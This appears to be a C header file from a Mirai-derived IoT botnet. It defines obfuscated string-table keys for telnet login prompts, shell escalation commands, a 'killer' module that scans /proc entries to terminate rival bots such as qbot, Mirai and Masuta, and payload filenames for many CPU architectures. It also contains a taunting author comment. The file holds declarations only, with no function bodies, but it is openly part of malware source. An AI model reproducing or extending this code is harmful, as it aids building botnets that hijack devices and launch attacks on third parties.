#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
struct table_value
{
    char *val;
    uint16_t val_len;
};

/* Defining Table Keys */
#define X_S_PORT 1

#define XOR_NULL 2

#define XOR_IOCTL_WATCH1 3
#define XOR_IOCTL_WATCH2 4

#define X_S_SHELL 5
#define X_S_ENABLE 6
#define X_S_SYSTEM 7
#define X_S_LINUXSHELL 8
#define X_S_SH 9

#define X_S_NCORRECT 10
#define X_S_OGIN 11
#define X_S_ENTER 12
#define X_S_ASSWORD 13

#define X_S_QUERY 14
#define X_S_RESP 15

#define RAPE_K_PROC 16
#define RAPE_K_EXE 17
#define RAPE_K_FD 18
#define RAPE_K_MAPS 19
#define RAPE_K_TCP 20
#define RAPE_K_STATUS 21
#define RAPE_K_ANIME 22

#define X_M_ASSWORD 23
#define X_M_NETSLINK 24
#define X_M_QBOT 25
#define X_M_MODZ 26
#define X_M_DEMON 27
#define X_M_SELF_EXE 38
#define X_M_UPX 39
#define X_M_ROUTE 30
#define X_M_RC 31
#define X_M_BINSH 32
//overlooked killer gtfo out of my source skids u will never understands networking and linux file system
#define T_K_TMP 33
#define T_K_DATALOCAL 34
#define T_K_QTX 35
#define T_K_DOT 36
#define T_K_ARM 37
#define T_K_QTX2 38
#define T_K_X86 39
#define T_K_SH4 40
#define T_K_MIPS 41
#define T_K_MPSL 42
#define T_K_SDA 43
#define T_K_MTD 44
#define RAPE_K_CMDLINE 45

#define T_K_mips 46
#define T_K_mpsl 47
#define T_K_sh4 48
#define T_K_x86 49
#define T_K_arm6 50
#define T_K_i686 51
#define T_K_ppc 52
#define T_K_i586 53
#define T_K_m68k 54
#define T_K_spc 55
#define T_K_arm 56
#define T_K_arm5 57
#define T_K_ppc440 58
#define T_K_arm7 59
#define T_K_arc 60
#define T_K_mips64 61
#define T_K_arm4 62
#define T_K_arm3 63
#define T_K_x86_32 64
// maps killer
#define TABLE_MAPS_MIRAI 65
#define RAPE_K_MASUTA 66



#define XOR_EXEC_SUCCESS 33
#define XOR_RANDOM 34

#define MAX_XOR_KEYS 67


void table_init(void);
void t_u_v(uint8_t);
void t_l_v(uint8_t);
char *t_r_v(int, int *);

static void a_e(uint8_t, char *, int);
static void toggle_obf(uint8_t);
